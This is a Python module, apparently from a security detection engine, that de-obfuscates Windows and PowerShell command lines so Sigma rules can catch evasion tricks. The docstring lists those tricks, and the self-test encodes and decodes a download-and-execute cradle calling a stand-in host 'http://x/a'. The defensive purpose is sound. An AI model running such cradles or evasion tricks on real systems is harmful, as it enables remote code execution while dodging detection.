"""Command-line cleaner: undo the cheap tricks attackers use to slip past string rules (public Sigma included).

    clean('p^o^w"e"rshell -e SQBFAFgA...')  ->  'powershell -e sqbfafga... || iex ...'

Done once at ingest into `cmdline_clean` (only when it differs from the plain lower-cased text). Sigma rules match
the original OR the cleaned text (engine/hunt/sigma.py), so every public rule also sees through:
  - cmd escapes and quote splitting:   p^o^w"e"r^shell, c""md
  - PowerShell backtick escapes:       I`nv`oke-`Expression
  - string concatenation:              'Inv'+'oke-Ex'+'pression', "Down"+"loadString"
  - Unicode dashes and odd spaces:     –enc (en dash), non-breaking spaces, repeated whitespace
  - case:                              PoWeRsHeLl
  - encoded commands:                  -enc / -e / -ec / -encodedcommand <base64 UTF-16LE>, FromBase64String('...')
  - environment-variable aliases:      %COMSPEC%, $env:ComSpec, %SystemRoot%
The decoded payload is appended after ' || ', so a rule on the inner command fires and the outer one still does.
"""
from __future__ import annotations

import base64
import binascii
import re

DASHES = dict.fromkeys(map(ord, "\u2013\u2014\u2015\u2212\u2010\u2011"), "-")
SPACES = dict.fromkeys(map(ord, "\u00a0\u2000\u2001\u2002\u2003\u2007\u2009\u200a\u202f\u3000\t"), " ")
ZERO_WIDTH = dict.fromkeys(map(ord, "\u200b\u200c\u200d\ufeff"), None)
ENV = [(re.compile(r"%comspec%|\$env:comspec", re.I), "c:\\windows\\system32\\cmd.exe"),
       (re.compile(r"%systemroot%|%windir%|\$env:systemroot|\$env:windir", re.I), "c:\\windows")]
CONCAT = re.compile(r"""(['"])\s*\+\s*\1""")                      # 'a'+'b' -> 'ab'
INNER_QUOTE = re.compile(r"""(?<=[\w.\-\\/])["'](?=[\w.\-\\/])""")    # p"ow"er -> power (quotes inside a word)
EMPTY_QUOTES = re.compile(r"""(?<=\w)(?:""|'')(?=\w)""")
BACKTICK = re.compile(r"`(?=[a-z0-9\-])", re.I)
ENC = re.compile(r"(?:^|\s)[-/](?:e|ec|en|enc|enco|encod|encode|encoded|encodedc\w*)\s+([A-Za-z0-9+/=]{16,})", re.I)
B64_CALL = re.compile(r"frombase64string\(\s*['\"]([A-Za-z0-9+/=]{16,})['\"]", re.I)
MAX = 8192


def _b64(s: str, utf16: bool) -> str | None:
    try:
        raw = base64.b64decode(s + "=" * (-len(s) % 4), validate=True)
    except (binascii.Error, ValueError):
        return None
    for enc in (("utf-16-le", "utf-8") if utf16 else ("utf-8", "utf-16-le")):
        try:
            txt = raw.decode(enc)
        except UnicodeDecodeError:
            continue
        if txt and sum(c.isprintable() or c in "\r\n\t" for c in txt) / len(txt) > 0.9:
            return txt
    return None


def _surface(s: str) -> str:
    s = s.translate(DASHES).translate(SPACES).translate(ZERO_WIDTH)
    s = s.replace("^", "")
    s = BACKTICK.sub("", s)
    for _ in range(3):                               # 'a'+'b'+'c' needs more than one pass
        s, n = CONCAT.subn("", s)
        if not n:
            break
    s = EMPTY_QUOTES.sub("", s)
    s = INNER_QUOTE.sub("", s)
    for rx, val in ENV:
        s = rx.sub(lambda _m, v=val: v, s)
    return re.sub(r" {2,}", " ", s).strip().lower()


def clean(cmd: str | None, depth: int = 0) -> str | None:
    """The cleaned command line (with decoded payloads appended), or None when it adds nothing."""
    if not cmd:
        return None
    cmd = str(cmd)[:MAX]
    out = _surface(cmd)
    flat = cmd.translate(DASHES).translate(SPACES).replace("^", "")   # find -enc behind a dash/caret trick, keep case
    decoded = [d for m in ENC.finditer(flat) if (d := _b64(m.group(1), utf16=True))]
    decoded += [d for m in B64_CALL.finditer(flat) if (d := _b64(m.group(1), utf16=False))]
    if decoded and depth < 2:                        # an encoded command that itself carries an encoded command
        out += " || " + " || ".join(clean(d, depth + 1) or d.lower() for d in decoded)
    return None if out == cmd.lower().strip() else out


if __name__ == "__main__":                           # self-check: python -m engine.ingest.clean
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')".encode("utf-16-le")).decode()
    assert clean('p^o^w"e"r^shell -NoP') == "powershell -nop"
    assert clean("I`nv`oke-`Expression $x") == "invoke-expression $x"
    assert clean("powershell 'Inv'+'oke-Ex'+'pression'") == "powershell 'invoke-expression'"
    assert clean("powershell \u2013enc " + enc).endswith("iex (new-object net.webclient).downloadstring('http://x/a')")
    assert clean("%COMSPEC% /c whoami") == "c:\\windows\\system32\\cmd.exe /c whoami"
    assert clean("whoami /all") is None and clean(None) is None
    print("clean: ok")
